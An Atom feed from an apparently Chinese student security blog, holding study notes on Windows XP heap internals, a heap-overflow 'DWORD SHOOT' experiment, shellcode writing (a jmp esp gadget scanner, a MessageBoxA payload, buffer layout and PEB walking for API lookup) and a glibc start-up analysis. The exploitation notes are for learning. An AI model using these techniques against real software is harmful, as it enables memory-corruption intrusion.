<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>wwNan&#39;s blog</title>
  <subtitle>对于发烧的病人要趁热吃</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.wuweinan.top/"/>
  <updated>2017-05-02T04:57:34.567Z</updated>
  <id>http://www.wuweinan.top/</id>
  
  <author>
    <name>Weinan Wu</name>
    <email>ceeq66@qq.com</email>
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Heap溢出</title>
    <link href="http://www.wuweinan.top/2017/05/02/Heap%E6%BA%A2%E5%87%BA/"/>
    <id>http://www.wuweinan.top/2017/05/02/Heap溢出/</id>
    <published>2017-05-02T03:38:03.000Z</published>
    <updated>2017-05-02T04:57:34.567Z</updated>
    
    <content type="html"><![CDATA[<h2 id="堆溢出利用"><a href="#堆溢出利用" class="headerlink" title="堆溢出利用"></a>堆溢出利用</h2><p>&emsp;&emsp;堆的空表使用双向链表结构，用数据去溢出下一个堆块块首的flink和blink指针，在进行堆操作时，就有机会在任意内存的任意地址写入任意的数据。<br><a id="more"></a><br>&emsp;&emsp;当堆溢出发生时，被攻击的堆块从双向链表卸下的时候，被攻击的flink和blink，blink可以指向任意内存地址，flink构造shellcode的首地址。</p>
<h2 id="调试中实验”DWORD-SHOOT”"><a href="#调试中实验”DWORD-SHOOT”" class="headerlink" title="调试中实验”DWORD SHOOT”"></a>调试中实验”DWORD SHOOT”</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">#include&lt;Windows.h&gt;</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	HLOCAL h1, h2, h3, h4, h5, h6;</div><div class="line">	HANDLE hp;</div><div class="line">	//0x1000 ~ 0x10000</div><div class="line">	hp = HeapCreate(0,0x1000, 0x10000); </div><div class="line">	</div><div class="line">	h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);</div><div class="line">	h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);</div><div class="line">	h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);</div><div class="line">	h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);</div><div class="line">	h5 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);</div><div class="line">	h6 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);</div><div class="line">	_asm int 3</div><div class="line">	HeapFree(hp, 0, h1);</div><div class="line">	HeapFree(hp, 0, h3);</div><div class="line">	HeapFree(hp, 0, h5);</div><div class="line"></div><div class="line">	h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);</div><div class="line"></div><div class="line"></div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>实验步骤:</strong></p>
<ol>
<li>创建堆区，申请6个大小为8字节的堆块</li>
<li>奇数释放，防止堆合并</li>
<li>再次申请，freelist[2]中最后一个项h5会被卸下</li>
<li>修改h5块首指针<br>&emsp;&emsp;堆区首地址是0x00350000，申请6个8字节空间，释放h1,h3,h5后的堆块块首如下图。h1,h3,h5的状态被改为0x00，空闲，然后被链入了freelist[2]，有了前指针和后指针，h5是最后一项。再次申请一个8字节空间，h5将会被卸下，现在直接修改h5的空表指针，可以观察到DWORD SHOOT。<br><img src="http://i.imgur.com/NfEyZ2j.png" alt=""><br><img src="http://i.imgur.com/31IVAwG.png" alt=""><br>&emsp;&emsp;上图显示0x00000000是非法地址。如果把后指针改为合法地址，0x44444444江北写入该地址。我把地址改为合法地址测试后，程序无误但是并没有修改数据，可能这里系统是XPSP3，堆做了防护，无法攻击。</li>
</ol>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;堆溢出利用&quot;&gt;&lt;a href=&quot;#堆溢出利用&quot; class=&quot;headerlink&quot; title=&quot;堆溢出利用&quot;&gt;&lt;/a&gt;堆溢出利用&lt;/h2&gt;&lt;p&gt;&amp;emsp;&amp;emsp;堆的空表使用双向链表结构，用数据去溢出下一个堆块块首的flink和blink指针，在进行堆操作时，就有机会在任意内存的任意地址写入任意的数据。&lt;br&gt;
    
    </summary>
    
    
      <category term="heap" scheme="http://www.wuweinan.top/tags/heap/"/>
    
      <category term="pwn" scheme="http://www.wuweinan.top/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>堆基础学习</title>
    <link href="http://www.wuweinan.top/2017/04/29/%E5%A0%86%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <id>http://www.wuweinan.top/2017/04/29/堆基础学习/</id>
    <published>2017-04-29T08:54:52.000Z</published>
    <updated>2017-05-01T03:28:13.916Z</updated>
    
    <content type="html"><![CDATA[<p>&emsp;&emsp;从《0day安全：软件漏洞分析技术》学习堆溢出知识。这学期开始学习操作系统，结合课上老师讲的内容，在写过CRT中的heap初始化程序后，对堆的基础知识有了一定了解，这里借助0day这本书里的代码学习如何调试堆等方法。<br><a id="more"></a></p>
<h1 id="空表"><a href="#空表" class="headerlink" title="空表"></a>空表</h1><p>&emsp;&emsp;环境为WinXPSP3,VC++6.0,release版本，代码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">#include&lt;Windows.h&gt;</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	HLOCAL h1, h2, h3, h4, h5, h6;</div><div class="line">	HANDLE hp;</div><div class="line">	//创建一个堆，0x1000 ~ 0x10000</div><div class="line">	hp = HeapCreate(0, 0x1000, 0x10000); </div><div class="line">	_asm int 3</div><div class="line"></div><div class="line">	//对分配的空间进行清零</div><div class="line">	h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 3);</div><div class="line">	h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 5);</div><div class="line">	h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 6);</div><div class="line">	h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);</div><div class="line">	h5 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 19);</div><div class="line">	h6 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 24);</div><div class="line"></div><div class="line">	HeapFree(hp, 0, h1);</div><div class="line">	HeapFree(hp, 0, h3);</div><div class="line">	HeapFree(hp, 0, h5);</div><div class="line">	HeapFree(hp, 0, h4);</div><div class="line"></div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="寻找内存中的堆"><a href="#寻找内存中的堆" class="headerlink" title="寻找内存中的堆"></a>寻找内存中的堆</h2><p>&emsp;&emsp;借助程序中的断点，使用OllyICE进行调试，在断点int 3 0x40101D处停住，点击M查看内存分布如下图,HeapCreate()创建的堆后返回的句柄放在eax中,因此知道0x00350000是该堆起始大小为0x1000,最大为0x10000。<br><img src="http://i.imgur.com/zYeidkj.png" alt=""></p>
<h2 id="识别堆表"><a href="#识别堆表" class="headerlink" title="识别堆表"></a>识别堆表</h2><p>&emsp;&emsp;上面已经知道整个堆区的起始地址是0x00350000。堆区的起始位置放着堆表，里面的重要信息包括堆块的位置、堆块的大小、空闲还是占用。从0x00350000开始堆表中的信息依次是段表索引、虚表索引、空表使用标识和空表索引区。起始处如下图，本程序在不同环境下变得只有方框内的堆区起始地址。<br><img src="http://i.imgur.com/RKk9M8U.png" alt=""><br>&emsp;&emsp;堆刚被初始化时，只有一个空闲态的大堆块，称为“尾块”，位于0x0688偏移处，所以地址就是0x00350688，等于Fresslist[0]中的第一项，此时，除了0号索引外，其余索引均指向自身。而空表索引起始于0x0035170，这种结构一直持续到0x00350580，共0x0400字节，每个空表索引项8个字节，正好128个空表项。<br><img src="http://i.imgur.com/3Blwur2.png" alt=""><br><img src="http://i.imgur.com/edTEVX6.png" alt=""><br>&emsp;&emsp;尾块开始于0x00350680，在0x00350688处也可以看到开头指向了0x0035178，构成双向链表。尾块的前8个字节是块首，尾块大小为0x130，计算单位是8字节，即0x980字节。块首结构如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">0   1    2        3           4             5     6            7         8</div><div class="line">--------------------------------------------------------------------------</div><div class="line">self size| previous chunk size|segment index|Flags|Unused bytes|tag index|</div><div class="line">--------------------------------------------------------------------------</div><div class="line">30 01       08 00                 00          10         00         00</div></pre></td></tr></table></figure></p>
<p><img src="http://i.imgur.com/QgMKpfk.png" alt=""></p>
<h2 id="堆块分配"><a href="#堆块分配" class="headerlink" title="堆块分配"></a>堆块分配</h2><p>&emsp;&emsp;堆块分配中除了请求分配的大小外，还需要额外的8字节的块首，因此实际分配大小=请求大小+8字节。单位是8字节，不足8字节则补全8字节，相当于对齐原则。本程序中连续6次请求内存,先看一下第一次分配的汇编代码:<br><img src="http://i.imgur.com/H99jdpd.png" alt=""><br>&emsp;&emsp;可以看到kernel32.HeapAlloc实际上调用的是ntdll中的RtlAllocateHeap函数。参数依次为3，8(HEAP_ZERO_MEMORY)，堆区首地址。请求大小的参数会转化为十六进制。继续运行，在分配时可以看到尾块块首的前两个字节由30 01 变为了02 00的变化，完成分配后，尾块大小变为0x120。<br><img src="http://i.imgur.com/8ho7Kph.png" alt=""><br>&emsp;&emsp;每次分配最少分配了8字节即2个单位的块大小，因为8字节对齐，所以单位增量也为2个单位块大小，所以h1~h4每次分配2个单位块大小，h5~h6每次分配4个单位块大小，供0x10个单位的块大小，和上图相同。新的尾块地址变为0x00350708，这是次优分配，从尾块每次切走一些小块。分配的六个堆块如下图，位置依次为h1,h2,h3,h4,h5,h6，被切割过的尾块。<br><img src="http://i.imgur.com/pv14tU3.png" alt=""></p>
<h2 id="堆块释放"><a href="#堆块释放" class="headerlink" title="堆块释放"></a>堆块释放</h2><p>&emsp;&emsp;h1,h3,h5不是连续的所以释放后不会发生合并。h1和h3被链入了Freelist[2]，h5被链入了Freslist[4]。因为外部原因重新生成了一个.exe，堆区起始地址变为0x00360000，尾块起始变为0x0x00360768，然后在调试态调试，确实防止程序溢出在  尾部增加了8个0xAB和0xFE或0x00。<br><img src="http://i.imgur.com/HT5669Z.png" alt=""></p>
<h2 id="堆的合并"><a href="#堆的合并" class="headerlink" title="堆的合并"></a>堆的合并</h2><p>&emsp;&emsp;释放h4，如下图，一整块连续的堆区被释放，回去看Freelist，h1的内存依旧被链入Freelist[2]，h3,h4,h5合并以后链入了Freelist[8]，因为大小是8个单位堆大小。<br><img src="http://i.imgur.com/AKk2UyC.png" alt=""><br><img src="http://i.imgur.com/ISjh1is.png" alt=""></p>
<h1 id="快表"><a href="#快表" class="headerlink" title="快表"></a>快表</h1><p>&emsp;&emsp;快表强调分配效率，不会进行堆块合并，每一个索引最多4项。运行环境不变，快表的空间申请代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">#include&lt;Windows.h&gt;</div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	HLOCAL h1, h2, h3, h4;</div><div class="line">	HANDLE hp;</div><div class="line">	//0x1000 ~ 0x10000</div><div class="line">	hp = HeapCreate(0, 0, 0); </div><div class="line">	_asm int 3</div><div class="line"></div><div class="line">	</div><div class="line">	h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);</div><div class="line">	h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8);</div><div class="line">	h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16);</div><div class="line">	h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 24);</div><div class="line"></div><div class="line">	HeapFree(hp, 0, h1);</div><div class="line">	HeapFree(hp, 0, h2);</div><div class="line">	HeapFree(hp, 0, h3);</div><div class="line">	HeapFree(hp, 0, h4);</div><div class="line">	h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16);</div><div class="line">	HeapFree(hp, 0, h2);</div><div class="line"></div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;堆区起始地址是0x00350000，尾块地址变为0x00351E90，快表的偏移依旧是0x0688，堆刚初始化后都是空的<br><img src="http://i.imgur.com/bvIyXJG.png" alt=""></p>
<p>&emsp;&emsp;申请的h1~h4堆块中，释放后8字节被插入lookaside[0],16字节插入lookaside[1],24字节插入lookaside[2]。<br><img src="http://i.imgur.com/lEzbvp2.png" alt=""></p>
<p>&emsp;&emsp;快表中的flags位是0x01，Busy状态，不能合并，而且只有指向下一堆块的指针。和空表的块首结构形成对比<br><img src="http://i.imgur.com/uEvVED3.png" alt=""></p>
<p>&emsp;&emsp;快表非空后，再申请16字节的空间，会从lookaside[2直接]卸下一个堆块。和上图形成对比。<br><img src="http://i.imgur.com/ieZ9kb9.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;emsp;&amp;emsp;从《0day安全：软件漏洞分析技术》学习堆溢出知识。这学期开始学习操作系统，结合课上老师讲的内容，在写过CRT中的heap初始化程序后，对堆的基础知识有了一定了解，这里借助0day这本书里的代码学习如何调试堆等方法。&lt;br&gt;
    
    </summary>
    
    
      <category term="heap" scheme="http://www.wuweinan.top/tags/heap/"/>
    
      <category term="pwn" scheme="http://www.wuweinan.top/tags/pwn/"/>
    
      <category term="笔记" scheme="http://www.wuweinan.top/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>shellcode学习</title>
    <link href="http://www.wuweinan.top/2017/04/27/shellcode%E5%AD%A6%E4%B9%A0/"/>
    <id>http://www.wuweinan.top/2017/04/27/shellcode学习/</id>
    <published>2017-04-27T05:51:57.000Z</published>
    <updated>2017-05-01T03:36:49.086Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于Shellcode的知识和实践"><a href="#关于Shellcode的知识和实践" class="headerlink" title="关于Shellcode的知识和实践"></a>关于Shellcode的知识和实践</h1><p>&emsp;&emsp;平常都是使用网上的shellcode，现在学一学怎么写shellcode和shellcode的艺术。<br><a id="more"></a></p>
<h2 id="jmp-esp"><a href="#jmp-esp" class="headerlink" title="jmp esp"></a>jmp esp</h2><p>&emsp;&emsp;缓冲区大小不足以塞下shellcode或无法精确定位到shellcode时，可以利用esp来作为一个跳板。esp中地址不会被破坏而且在函数返回时，esp指向返回地址的下一个位置。所以把shellcode放在返回地址之后，函数返回时先去执行jmp esp或call esp等指令，之后正好跳进shellcode。可以从和程序一起被加载进内存的动态链接库中获取jmp esp的地址，kernel32.dll,user32.dll等。以下代码可以获取地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">#include&lt;Windows.h&gt;</div><div class="line">#include&lt;stdio.h&gt;</div><div class="line">#define DLL_NAME &quot;user32.dll&quot;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	BYTE* ptr;</div><div class="line">	int position, address;</div><div class="line">	HINSTANCE handle;</div><div class="line">	BOOL done_flag = FALSE;</div><div class="line">	handle = LoadLibrary(DLL_NAME);</div><div class="line">	if (!handle)</div><div class="line">	&#123;</div><div class="line">		printf(&quot;load error !\n&quot;);</div><div class="line">		exit(0);</div><div class="line">	&#125;</div><div class="line">	ptr = (BYTE*)handle;</div><div class="line"></div><div class="line">	for (position = 0; !done_flag; position++)</div><div class="line">	&#123;</div><div class="line"></div><div class="line">			if (ptr[position] == 0xFF &amp;&amp; ptr[position + 1] == 0xE4)</div><div class="line">			&#123;</div><div class="line">				//0xFFE4 jmp esp</div><div class="line">				address = (int)ptr + position;</div><div class="line">				printf(&quot;OPCODE found at 0x%x\n&quot;, address);</div><div class="line">			&#125;</div><div class="line">	&#125;</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;这里选择0x7e493400处的jmp esp作为跳板，shellcode中调用的MessageboxA地址是0x7e4507ea，ExitProcess地址是0x7c81cafa。shellcode如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">#include&lt;Windows.h&gt;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	HINSTANCE libHandle;</div><div class="line">	char dll[11] = &quot;user32.dll&quot;;</div><div class="line">	libHandle = LoadLibrary(dll);</div><div class="line">	_asm &#123;</div><div class="line">		sub sp, 0x440</div><div class="line">		xor ebx,ebx</div><div class="line">		push ebx	//cut string</div><div class="line">		push 0x74736577	//fialwest</div><div class="line">		push 0x6c696166</div><div class="line"></div><div class="line">		mov eax,esp</div><div class="line">		push ebx</div><div class="line">		push eax</div><div class="line">		push eax</div><div class="line">		push ebx</div><div class="line"></div><div class="line">		mov eax,0x7e4507ea</div><div class="line">		call eax	//call MessageboxA</div><div class="line"></div><div class="line">		push ebx</div><div class="line">		mov eax, 0x7c81cafa</div><div class="line">		call eax	//call exit(0)</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;把shellcode转化为机器码，再根据缓冲区的情况，假设缓冲区大小为20字节。可以先填入24任意字节，再填入jmp esp地址0x7e493400，后面跟shellcode机器码。这样就不用去找buf的起始地址了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">00401067  |.  33DB          xor     ebx, ebx</div><div class="line">00401069  |.  53            push    ebx</div><div class="line">0040106A  |.  68 77657374   push    74736577</div><div class="line">0040106F  |.  68 6661696C   push    6C696166</div><div class="line">00401074  |.  8BC4          mov     eax, esp</div><div class="line">00401076  |.  53            push    ebx</div><div class="line">00401077  |.  50            push    eax</div><div class="line">00401078  |.  50            push    eax</div><div class="line">00401079  |.  53            push    ebx</div><div class="line">0040107A  |.  B8 EA07457E   mov     eax, 7E4507EA</div><div class="line">0040107F  |.  FFD0          call    eax</div></pre></td></tr></table></figure></p>
<h2 id="动态定位API"><a href="#动态定位API" class="headerlink" title="动态定位API"></a>动态定位API</h2><p>&emsp;&emsp;动态链接库在不同的操作系统下，加载基址不同。所以要根据不同的系统动态定位API地址，提高shellcode兼容性。方法如下:</p>
<blockquote>
<p>FS为TEB的基址，基址+0x30放着PEB指针<br>PEB中偏移0X0C放着PEB_LDR_DATA结构体的指针<br>PEB_LDR_DATA偏移0X1C是指向模块初始化链表的指针<br>模块初始化链表第一个结点是ntdll.dll,第二个是kernell.dll，以此类推<br>找到kernel.dll后，基址加0x08是在加载基地址(1)，从加载基址偏移0X3C是PE头<br>PE头偏移0x78是函数导出表的指针，根据导出函数序号可以找到相应的函数偏移(2)<br>API的地址为(1)+(2)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">mov ebx,fs:[edx+0x30]	//PEB</div><div class="line">mov ecx,[ebx+0x0C]	//PLD</div><div class="line">mov ecx,[ecx+0x1C]	//list</div><div class="line">mov ecx,[ecx]		//kernel.dll entry</div><div class="line">mov ebp,[ecx+0x08]	//base address</div></pre></td></tr></table></figure></p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;关于Shellcode的知识和实践&quot;&gt;&lt;a href=&quot;#关于Shellcode的知识和实践&quot; class=&quot;headerlink&quot; title=&quot;关于Shellcode的知识和实践&quot;&gt;&lt;/a&gt;关于Shellcode的知识和实践&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;平常都是使用网上的shellcode，现在学一学怎么写shellcode和shellcode的艺术。&lt;br&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://www.wuweinan.top/tags/pwn/"/>
    
      <category term="笔记" scheme="http://www.wuweinan.top/tags/%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Mini CRT的实现</title>
    <link href="http://www.wuweinan.top/2017/04/20/Mini-CRT/"/>
    <id>http://www.wuweinan.top/2017/04/20/Mini-CRT/</id>
    <published>2017-04-20T03:16:10.000Z</published>
    <updated>2017-05-01T03:35:48.614Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分析linux和windows下C运行库"><a href="#分析linux和windows下C运行库" class="headerlink" title="分析linux和windows下C运行库"></a>分析linux和windows下C运行库</h1><p>&emsp;&emsp;初步学习以后会一步步完善。通过对Glibc和MSVC CRT的分析，程序不是从main开始运行，在main之前要对参数、环境变量进行设置，初始化程序的堆和I/O等,然后调用主函数main，最后清理运行后的各种资源。这些需要运行库的入口函数来实现。<br><a id="more"></a></p>
<h2 id="Glibc入口函数分析"><a href="#Glibc入口函数分析" class="headerlink" title="Glibc入口函数分析"></a>Glibc入口函数分析</h2><p>&emsp;&emsp;glibc源码可以在<a href="http://www.gnu.org/software/libc/sources.html" title="这里" target="_blank" rel="external">http://www.gnu.org/software/libc/sources.html</a>下载，相关文档在<a href="http://www.gnu.org/software/libc/manual/html_mono/libc.html" title="这里" target="_blank" rel="external">http://www.gnu.org/software/libc/manual/html_mono/libc.html</a>。根据静态glibc和动态glibc、用于可执行文件和共享库，可以有四种组合。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line">glibc/sysdeps/i386/start.S:</div><div class="line">_start:</div><div class="line">        xorl %ebp, %ebp /* 让ebp清零，体现这个最外层函数的地位 */</div><div class="line"></div><div class="line">        /* 在调用_start前，装载器已经把用户的环境变量和参数入栈</div><div class="line">	   ------------------------------------------------&gt;栈增长方向</div><div class="line">	   0 env[n]···env[0] 0 arg[n] arg[n-1]···arg[0] argc</div><div class="line">	   -------------------------------------------------</div><div class="line">                  env              argv                  </div><div class="line">           env和argv将会作为参数，用在随后的__libc_start_main中 */</div><div class="line">	popl %esi               /* argc出栈赋给%esi  */</div><div class="line">        movl %esp, %ecx         /* 新的%esp指向arg[0]，将栈顶地址传给%ecx.*/</div><div class="line"></div><div class="line">        /* Before pushing the arguments align the stack to a 16-byte</div><div class="line">        (SSE needs 16-byte alignment) boundary to avoid penalties from</div><div class="line">        misaligned accesses.  Thanks to Edward Seidl &lt;seidl@janed.com&gt;</div><div class="line">        for pointing this out.  */</div><div class="line">        /* 上面是原版注释，ISA是指令集体系结构，SSEn是具体的指令集，以前弄混了 */</div><div class="line">        andl $0xfffffff0, %esp</div><div class="line">        pushl %eax              /* Push garbage because we </div><div class="line">					allocate 28 more bytes.  */</div><div class="line"></div><div class="line">        pushl %esp		/* 提供最高的堆栈地址 */</div><div class="line"></div><div class="line">        pushl %edx              /* 压入动态共享加载的收尾 */</div><div class="line"></div><div class="line">/* 如果是动态链接 */</div><div class="line">#ifdef SHARED</div><div class="line">        /* Load PIC register.定义在末尾 */</div><div class="line">        call 1f </div><div class="line">        addl $_GLOBAL_OFFSET_TABLE_, %ebx　/* GOT */</div><div class="line"></div><div class="line">        /* Push address of our own entry points to .fini and .init.  */</div><div class="line">        leal __libc_csu_fini@GOTOFF(%ebx), %eax</div><div class="line">        pushl %eax</div><div class="line">        leal __libc_csu_init@GOTOFF(%ebx), %eax</div><div class="line">        pushl %eax</div><div class="line"></div><div class="line">        pushl %ecx              /* Push second argument: argv.  */</div><div class="line">        pushl %esi              /* Push first argument: argc.  */</div><div class="line"></div><div class="line">        pushl main@GOT(%ebx)</div><div class="line"></div><div class="line">        /* Call the user&apos;s main function, and exit with its value.</div><div class="line">           But let the libc call main.    */</div><div class="line">        call __libc_start_main@PLT</div><div class="line">#else</div><div class="line">        /* Push address of our own entry points to .fini and .init.  */</div><div class="line">        pushl $__libc_csu_fini</div><div class="line">        pushl $__libc_csu_init</div><div class="line"></div><div class="line">        pushl %ecx              /* Push second argument: argv.  */</div><div class="line">        pushl %esi              /* Push first argument: argc.  */</div><div class="line"></div><div class="line">        pushl $main</div><div class="line"></div><div class="line">        /* Call the user&apos;s main function, and exit with its value.</div><div class="line">           But let the libc call main.    */</div><div class="line">        call __libc_start_main</div><div class="line">#endif</div><div class="line"></div><div class="line">        hlt                     /* 用于检测exit是否正常返回，不执行为正常 */</div><div class="line"></div><div class="line">#ifdef SHARED</div><div class="line">1:      movl    (%esp), %ebx</div><div class="line">        ret</div><div class="line">#endif</div></pre></td></tr></table></figure></p>
<p>静态链接和动态链接区别好理解，动态链接对fini,init等函数寻址有所不同，对函数调用过程主体如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">pushl %esp </div><div class="line">pushl %edx </div><div class="line">pushl $__libc_csu_fini</div><div class="line">pushl $__libc_csu_init</div><div class="line">pushl %ecx</div><div class="line">pushl %esi</div><div class="line">pushl main</div><div class="line">call __libc_start_main</div></pre></td></tr></table></figure></p>
<p>_start -&gt; __libc_start_main,在glibc/csu/libc-start.c中,以下是函数定义:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">STATIC int LIBC_START_MAIN (int (*main) (int, char **, char **</div><div class="line">                                         MAIN_AUXVEC_DECL),</div><div class="line">                            int argc,</div><div class="line">                            char **argv,</div><div class="line">#ifdef LIBC_START_MAIN_AUXVEC_ARG</div><div class="line">                            ElfW(auxv_t) *auxvec,</div><div class="line">#endif</div><div class="line">                            __typeof (main) init,</div><div class="line">                            void (*fini) (void),</div><div class="line">                            void (*rtld_fini) (void),</div><div class="line">                            void *stack_end)</div><div class="line">     __attribute__ ((noreturn));</div></pre></td></tr></table></figure></p>
<p>一共7个参数，和_start中的调用一致</p>
<blockquote>
